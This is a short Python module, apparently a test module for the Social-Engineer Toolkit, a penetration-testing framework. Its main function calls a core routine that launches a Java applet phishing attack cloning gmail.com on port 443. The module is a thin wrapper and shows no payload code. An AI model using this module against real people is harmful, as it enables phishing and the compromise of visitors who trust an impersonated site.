#!/usr/bin/env python

# These are required fields

import sys

# switch over to import core
sys.path.append("src/core")
# import the core modules
try: reload(core)
except: import core

MAIN = "   This is a test module"
AUTHOR = "   Dave - davek@social-engineer.org"

# def main(): header is required
def main():
	core.java_applet_attack("https://gmail.com","443","reports/")
	pause=raw_input("   This module has finished completing. Press <enter> to continue")
